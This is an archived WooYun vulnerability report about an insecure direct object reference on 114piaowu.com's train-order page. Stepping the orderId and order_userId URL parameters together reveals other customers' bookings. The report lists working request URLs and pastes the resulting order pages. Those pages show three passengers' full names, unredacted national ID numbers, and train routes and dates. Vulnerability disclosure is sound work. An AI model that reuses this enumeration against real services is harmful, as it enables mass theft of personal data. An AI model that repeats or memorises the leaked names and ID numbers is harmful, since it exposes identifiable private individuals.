{"id": 87305, "wybug_id": "wooyun-2016-0213011", "wybug_title": "114票务网某站逻辑漏洞利用支付超时导致上万用户敏感信息泄漏（订单号/姓名/身份证/火车出发路线）", "wybug_corp": "114piaowu.com", "wybug_author": "0x 80", "wybug_date": "2016-05-26 11:09", "wybug_open_date": "2016-05-31 13:40", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "错误信息未屏蔽", "用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-26：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 114票务网某站逻辑漏洞利用支付超时导致上万用户敏感信息泄漏（订单号/姓名/身份证/火车出发路线） 详细说明：  http://m.114piaowu.com/userCenterTrain/userCenterTrain_payTrainOrder.action?orderId=9272363&order_userId=5311555\n\n问题参数：orderId=和order_userId没有被加密导致逻辑，9272363递增1的时候，5311555也必须递增1即可9272363递减1的时候，5311555也必须递减1即可，依此类推\n\n\n<div class=\"wrapper radius clearfix order_content\">\t\t\t<h5>订单详情：&nbsp;<b>S2016020511211093656</b></h5>\t\t\t<div>\t\t\t\tG7338&nbsp;永康南-金华南&nbsp;&nbsp;\t\t\t\t2016年02月06日&nbsp;二等座&nbsp;\t\t\t\t自取票&nbsp;&nbsp;\t\t\t\t1张\t\t\t</div>\t\t\t<h5>\t\t\t\t乘客信息：\t\t\t</h5>\t\t\t<table>\t\t\t\t<tr>\t\t\t\t\t<td>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t金妙缘&nbsp;\t\t\t\t\t\t成人票&nbsp;&nbsp;\t\t\t\t\t\t<br/>(330702199905102342)\t\t\t\t\t</td>\t\t\t\t\t</table>\nhttp://m.114piaowu.com/userCenterTrain/userCenterTrain_payTrainOrder.action?orderId=9272364&order_userId=5311556\n\n\n<h5>订单详情：&nbsp;<b>H2016020511214527799</b></h5>\t\t\t<div>\t\t\t\tK9788&nbsp;焉耆-乌鲁木齐南&nbsp;&nbsp;\t\t\t\t2016年02月06日&nbsp;硬座&nbsp;\t\t\t\t自取票&nbsp;&nbsp;\t\t\t\t1张\t\t\t</div>\t\t\t<h5>\t\t\t\t乘客信息：\t\t\t</h5>\t\t\t<table>\t\t\t\t<tr>\t\t\t\t\t<td>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t张哈车&nbsp;\t\t\t\t\t\t成人票&nbsp;&nbsp;\t\t\t\t\t\t<br/>(652826196712292329)\t\t\t\t\t</td>\t\t\t\t\t</table>\nhttp://m.114piaowu.com/userCenterTrain/userCenterTrain_payTrainOrder.action?orderId=9272361&order_userId=5311553\n\n\n<h5>订单详情：&nbsp;<b>H2016020511205940865</b></h5>\t\t\t<div>\t\t\t\tK267&nbsp;荆门-澧县&nbsp;&nbsp;\t\t\t\t2016年02月07日&nbsp;硬座&nbsp;\t\t\t\t自取票&nbsp;&nbsp;\t\t\t\t1张\t\t\t</div>\t\t\t<h5>\t\t\t\t乘客信息：\t\t\t</h5>\t\t\t<table>\t\t\t\t<tr>\t\t\t\t\t<td>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t戴潮&nbsp;\t\t\t\t\t\t成人票&nbsp;&nbsp;\t\t\t\t\t\t<br/>(430723199401035815)\t\t\t\t\t</td>\t\t\t\t\t</table>\n   漏洞证明：  \nhttp://m.114piaowu.com/userCenterTrain/userCenterTrain_payTrainOrder.action?orderId=9272363&order_userId=5311555\n\n问题参数：orderId=和order_userId没有被加密导致逻辑，9272363递增1的时候，5311555也必须递增1即可9272363递减1的时候，5311555也必须递减1即可，依此类推查询上万用户敏感信息\n\nhttp://m.114piaowu.com/userCenterTrain/userCenterTrain_payTrainOrder.action?orderId=9272363&order_userId=5311555\n   修复方案：     版权声明：转载请注明来源 0x 80@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-31 13:40 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}